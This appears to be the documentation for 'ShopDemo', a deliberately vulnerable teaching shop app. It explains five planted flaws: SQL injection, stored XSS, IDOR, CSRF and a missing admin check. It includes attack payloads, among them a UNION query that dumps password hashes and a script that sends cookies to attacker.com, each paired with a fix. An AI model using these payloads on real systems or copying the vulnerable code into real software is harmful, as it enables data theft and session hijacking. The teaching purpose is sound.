# ShopDemo Vulnerabilities

## 1. SQL Injection (SQLi)

**File:** `routers/store.py:101`
**Endpoint:** `GET /search?q=`

### The vulnerable code

```python
query = text(f"SELECT * FROM products WHERE name LIKE '%{q}%' OR description LIKE '%{q}%'")
results = db.execute(query).fetchall()
```

The user-supplied query parameter `q` is **string-interpolated directly into the SQL query**. There is no sanitization, no parameterization.

### How it works

A normal request looks like this:

```
GET /search?q=laptop
```

Which executes:
```sql
SELECT * FROM products WHERE name LIKE '%laptop%' OR description LIKE '%laptop%'
```

But an attacker can **break out of the string context** with a single quote and inject arbitrary SQL:

```
GET /search?q=' OR '1'='1
```

Which executes:
```sql
SELECT * FROM products WHERE name LIKE '%' OR '1'='1%' OR description LIKE '%' OR '1'='1%'
```

Since `'1'='1'` is always true, this dumps **every row** from the products table.

Going further, an attacker can use `UNION`-based injection to pull data from other tables entirely:

```
GET /search?q=' UNION SELECT id, username, password, email, NULL, NULL, NULL, NULL FROM users--
```

This would return all usernames and password hashes from the `users` table in the search results — a full data breach.

### Why this specific pattern is dangerous

The code uses SQLAlchemy's `text()` with an f-string. This bypasses the ORM's built-in protection. The safe version would be:

```python
text("SELECT * FROM products WHERE name LIKE :q OR description LIKE :q")
db.execute(query, {"q": f"%{q}%"})
```

Bound parameters are never interpreted as SQL — only as data.

---

## 2. Stored XSS (Cross-Site Scripting)

**Files:** `routers/admin.py:106` (stored) + `templates/admin/products.html:112` (rendered)
**Endpoints:** `POST /admin/products` (inject) → `GET /admin/products` (trigger)

### The vulnerable code

In the router, the description is stored raw with no sanitization:
```python
product = Product(
    description=description,  # stored exactly as submitted
    ...
)
```

In the template, it's rendered with the `|safe` filter:
```html
{{ product.description|safe }}
```

### How it works

Jinja2 **auto-escapes HTML by default** — `<script>` would normally become `&lt;script&gt;`, harmless text. The `|safe` filter **disables that protection**, telling Jinja2 "trust this string, render it as raw HTML."

So an attacker (or a compromised admin account) creates a product with this as the description:

```html
<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
```

That payload gets stored in the database. Every time any admin visits `GET /admin/products`, the script executes in their browser — stealing their session cookie and sending it to the attacker's server.

### Why it's "stored" XSS specifically

There are three types:
- **Reflected** — payload lives in the URL, only fires when you click the link
- **DOM-based** — payload never touches the server
- **Stored (persistent)** — payload is saved to the database and fires for **every user** who views the page, permanently, until removed

This is stored XSS, which is the most dangerous kind. One injection poisons every subsequent visitor automatically. An attacker could use it to hijack admin sessions, deface the page, or redirect users to malware.

---

## 3. IDOR (Insecure Direct Object Reference)

**File:** `routers/orders.py:91`
**Endpoint:** `GET /orders/{order_id}`

### The vulnerable code

```python
order = db.query(Order).filter(Order.id == order_id).first()
# no check that order.user_id == user["id"]
```

The server checks that you're logged in — but never checks that the order belongs to you.

### How it works

You're logged in as user A, and your order is #42. You notice the URL:
```
GET /orders/42
```

You just change the number:
```
GET /orders/1
GET /orders/2
GET /orders/3
...
```

Each one returns the full order detail of another user — their name, items purchased, address, total paid. You're enumerating every order in the system just by incrementing an integer.

The fix is a single added condition:

```python
# safe version
order = db.query(Order).filter(
    Order.id == order_id,
    Order.user_id == user["id"]  # ownership check
).first()
```

Without that line, the ID in the URL is the only access control — and it's entirely controlled by the attacker.

### Why "Insecure Direct Object Reference"

The "object" is the database row. The "direct reference" is the ID in the URL. It's "insecure" because referencing the object directly grants access to it — there's no authorization layer in between. The ID is both the locator and the key, and the key is public.

This is one of the most common real-world vulnerabilities. It shows up in order IDs, invoice IDs, user profile IDs, file download endpoints — anywhere a number in a URL maps directly to a database row.

---

## 4. CSRF (Cross-Site Request Forgery)

**File:** `routers/orders.py:35`
**Endpoint:** `POST /checkout`

### The vulnerable code

```python
@router.post("/checkout")  # VULN:CSRF — no CSRF token validation
async def checkout_submit(request: Request, db: Session = Depends(get_db)):
    user = request.session.get("user")
    # proceeds if session cookie is valid — no other verification
```

The server only checks that a valid session cookie is present. It does not verify that the request actually originated from the ShopDemo site.

### How it works

Browsers automatically attach cookies to every request — including requests triggered by other websites. An attacker hosts this HTML on their own site:

```html
<form action="http://shopdemo.com/checkout" method="POST" id="f">
</form>
<script>document.getElementById('f').submit()</script>
```

When a logged-in ShopDemo user visits the attacker's page, their browser silently submits a POST to `/checkout`. The session cookie is attached automatically. The server sees a valid session and processes the checkout — the victim just placed an order without knowing it.

### Why the server can't tell the difference

From the server's perspective, a legitimate checkout and a CSRF-triggered checkout look identical:
- Same session cookie
- Same POST to `/checkout`
- Same IP (the victim's)

The only difference is where the request originated — and the server never checks that.

### The fix — CSRF tokens

The standard defense is a CSRF token: a secret random value embedded in the form that the attacker's site cannot know.

```html
<!-- legitimate form on shopdemo.com -->
<form method="POST" action="/checkout">
  <input type="hidden" name="csrf_token" value="a3f8...x92k">
</form>
```

The server generates this token, ties it to the session, and validates it on every state-changing POST. The attacker's site can't read it (same-origin policy blocks cross-origin reads), so their forged form submission fails validation.

### Chaining with XSS

CSRF on its own requires tricking a specific logged-in victim into visiting an external malicious page. But combined with the stored XSS from vulnerability #2, the attack becomes much more powerful: the malicious form can be injected directly into ShopDemo itself. Every admin who loads `/admin/products` triggers the CSRF automatically — no external link, no social engineering needed.

---

## 5. Broken Access Control (BAC)

**File:** `routers/admin.py:121`
**Endpoint:** `POST /admin/products/delete/{product_id}`

### The vulnerable code

```python
@router.post("/products/delete/{product_id}")  # VULN:BAC
async def products_delete(
    product_id: int,
    db: Session = Depends(get_db),
    # no current_user dependency, no is_admin check
):
```

Compare this to every other admin endpoint, which has:
```python
current_user: User = Depends(admin_required)
```

This one endpoint is simply missing it. Any request that hits this URL — authenticated or not — can delete a product.

### How it works

A regular user (or even an unauthenticated attacker) just sends:

```
POST /admin/products/delete/1
POST /admin/products/delete/2
POST /admin/products/delete/3
...
```

No session cookie required. The entire product catalog can be wiped in seconds with a simple script.

### Why this is different from IDOR

IDOR is about accessing **data you shouldn't see**. BAC is broader — it's about performing **actions you shouldn't be allowed to perform**. Here the action is deletion, and the access control check was simply never added to this one endpoint.

This is a classic mistake in real codebases: access control applied inconsistently. The developer secured the GET and POST create endpoints but missed the delete. It's easy to miss one route, especially as an API grows.

### The broader category

BAC is OWASP's #1 most critical web vulnerability. It covers everything from missing role checks like this, to path traversal, to privilege escalation. The pattern is always the same: the server assumes a request is authorized without actually verifying it.
